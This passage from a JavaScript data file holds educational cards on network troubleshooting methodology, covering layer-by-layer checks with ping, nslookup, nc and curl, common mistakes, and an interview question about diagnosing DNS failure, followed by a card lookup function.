      "howSolves": "Following the 7-layer OSI model bottom-up (L1 Physical -> L2 Link -> L3 Network -> L4 Transport -> L7 Application) isolates the exact point of failure within minutes."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Network Troubleshooting Methodology work?",
      "steps": [
        {
          "step": 1,
          "title": "Step 1: Check Physical & Link (L1/L2)",
          "desc": "Is cable plugged in? Are link lights blinking? Is Wi-Fi associated? Check `ipconfig /all` or `ip link`."
        },
        {
          "step": 2,
          "title": "Step 2: Check Local IP & Gateway (L3)",
          "desc": "Do you have a valid IP (not 169.254 APIPA)? Can you ping your Default Gateway (`ping 192.168.1.1`)?"
        },
        {
          "step": 3,
          "title": "Step 3: Check External Internet IP (L3)",
          "desc": "Can you ping a public IP (`ping 8.8.8.8`)? If yes, IP routing works; if no, WAN uplink is dead."
        },
        {
          "step": 4,
          "title": "Step 4: Check DNS Resolution (L7)",
          "desc": "Can you resolve domain names (`nslookup google.com` or `dig google.com`)? If ping 8.8.8.8 works but ping google.com fails, DNS is broken."
        },
        {
          "step": 5,
          "title": "Step 5: Check Port & Service Reachability (L4/L7)",
          "desc": "Is target port open? Test with `nc -zv target 443` or `curl -Iv https://example.com`."
        }
      ],
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Bottom-Up Approach": "Starts at Layer 1 (cables) and works up to Layer 7 (software). Best for physical/hardware issues.",
        "Top-Down Approach": "Starts at Layer 7 (application error) and works down. Best for experienced software engineers.",
        "Divide-and-Conquer": "Starts at Layer 3/4 (ping gateway / ping public IP). Tests middle of stack to eliminate half the layers instantly.",
        "Essential Diagnostic Toolkit": "ipconfig/ifconfig, ping, traceroute/tracert, nslookup/dig, netstat/ss, curl, wireshark/tcpdump"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A user complains: 'I cannot open internal sales reports at https://reports.corp.com'.",
      "challenge": "Where is the failure? User's Wi-Fi? Local DNS? Firewall? Server crashed? SSL expired?",
      "resolution": "1. `ping 192.168.1.1` (Gateway works). 2. `ping 8.8.8.8` (Internet works). 3. `nslookup reports.corp.com` (Returns 10.0.5.20 - DNS works). 4. `nc -zv 10.0.5.20 443` (Connection refused - Port 443 is closed: the web server process died).",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "IP Valid Check": "ipconfig (Windows) or ip addr (Linux)",
        "Port Listening Check": "ss -tuln (Linux) or netstat -an (Windows)",
        "DNS Test": "nslookup example.com 8.8.8.8 (bypasses local cache to query Google DNS directly)",
        "HTTP Debug": "curl -Iv https://example.com (displays TLS negotiation and HTTP headers)"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Network Troubleshooting Methodology (Physical -> Application). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "Flushing DNS cache when the network cable is unplugged.",
          "why": "L1 physical connection is broken; L7 software operations cannot fix a disconnected cable.",
          "correct": "Always verify Layer 1 and Layer 2 link status before troubleshooting higher-layer DNS or application configurations."
        },
        {
          "wrong": "Assuming ping failure means the server is completely down.",
          "why": "ICMP may be blocked by a firewall while HTTP (port 80/443) is working perfectly.",
          "correct": "Use `curl` or `nc` to test the specific TCP application port directly."
        },
        {
          "wrong": "Modifying 5 different network configuration files at once during an outage.",
          "why": "You will have no idea which change fixed the problem or what new bugs were introduced.",
          "correct": "Change ONE variable at a time, test, and document results."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "A user reports that they cannot access a website using its domain name (https://example.com), but they CAN access it by typing its direct IP address (https://93.184.216.34) into the browser. What is the root cause, and how do you diagnose it?",
          "a": "The root cause is a DNS (Domain Name System) failure. Because the user can reach the web server using its direct IP address, we know that: 1. Layer 1 Physical link is working. 2. Layer 2 Data Link is working. 3. Layer 3 IP routing and default gateway are working. 4. Layer 4 TCP handshake on port 443 succeeds. 5. Layer 7 web server is alive and responding. The failure occurs exclusively when resolving the hostname 'example.com' to that IP. Diagnostic steps: 1. Check local hosts file (`/etc/hosts` or `C:\\Windows\\System32\\drivers\\etc\\hosts`) for corrupted overrides. 2. Test DNS resolution using `nslookup example.com` or `dig example.com`. If it fails, check the configured DNS server in `ipconfig /all` or `/etc/resolv.conf`. 3. Query a known public DNS server: `nslookup example.com 8.8.8.8`. If the public server succeeds, the user's local ISP or corporate DNS server is down or misconfigured. 4. Flush local DNS cache with `ipconfig /flushdns`.",
          "tip": "State the root cause in the first 5 seconds: 'It is a DNS resolution failure', then systematically explain why every other layer works."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Systematic OSI approach: Cable -> Gateway IP -> Public IP (8.8.8.8) -> DNS resolution -> Port test (curl/nc).",
        "summaryPoints": [
          "Isolate Layer 1/2: Check link light and valid IP (not 169.254 APIPA).",
          "Isolate Layer 3: Ping Default Gateway (local subnet), then ping 8.8.8.8 (Internet uplink).",
          "Isolate Layer 7 DNS: Ping domain name; test with `nslookup` or `dig`.",
          "Isolate Layer 4/7 Service: Test specific TCP port with `curl -v` or `nc -zv`."
        ],
        "whenToUse": "The ultimate practical methodology used in production SRE support, NOC diagnostics, and technical interviews."
      }
    }
  ]
};

import { resolveCNTopicId } from './cnTopicDataRegistry.js';

/**
 * Returns the exact 10 theory cards for a given canonical topicId.
 * Falls back to 'osi-model' if topicId is unset or invalid.
 */
export function getCNTopicCards(rawTopicId) {
  if (!rawTopicId) return CN_TOPIC_CARDS['osi-model'];
  const canonicalId = resolveCNTopicId(rawTopicId);
  return CN_TOPIC_CARDS[canonicalId] || CN_TOPIC_CARDS['osi-model'];
}
